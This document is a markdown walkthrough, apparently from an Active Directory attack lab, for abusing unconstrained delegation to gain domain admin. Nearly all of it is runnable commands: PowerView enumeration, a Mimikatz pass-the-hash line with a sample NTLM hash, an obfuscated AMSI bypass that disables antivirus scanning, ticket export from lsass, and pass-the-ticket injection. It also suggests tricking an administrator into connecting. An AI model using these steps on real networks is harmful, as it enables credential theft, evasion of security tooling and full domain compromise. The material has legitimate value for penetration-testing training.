# Abusing Unconstrained Delegation privileges


1. Find server that has unconstrained delegation enabled
```powershell
Get-NetComputer -Unconstrained
```

Now, we need to find if we one of our compromised victims have local admin to these host identified above. e.g.

Assuming you have NTLM hash to a victim and gain accessed to it already.
```
# If you have NTLM hash

Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

2. Need local admin to victim
```powershell

# .\Powerview.ps1 
Find-LocalAdminAccess

# .\Find-PSRemotingLocalAdminAccess.ps1
Find-PSRemotingLocalAdminAccess

```
We start a powershell session as compromised machine users to start looking if we have localadmin to those unconstrained servers

3. Export domain admin ticket on the Unconstrainted server

Load mimikatz on unconstrained server and start exporting domain admin ticket

```powershell
# Run mimikatz on target to see if domain admin ticket already present

powershell -ep bypass

$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local

Enter-PSSession -Session $sess

sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )

exit

Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimikatz.ps1 -Session $sess

Enter-PSSession -Session $sess

mkdir userX

Invoke-Mimikatz -Command '"sekurlsa::tickets /export"'

ls | select name

# you are looking for the administrator@krbtgt ticket like this:
# Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

If no ticket, wait / trick DA to access resource on victim then run export ticket command again
```powershell
Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

4. Use ticket by injecting it into lsass to get DA privileges
```powershell
Invoke-Mimikatz -Command '"kerberos::ptt [0;3c4d02]-2-0-60a10000 -Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'
```

5. check if succeed
```powershell
Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
```




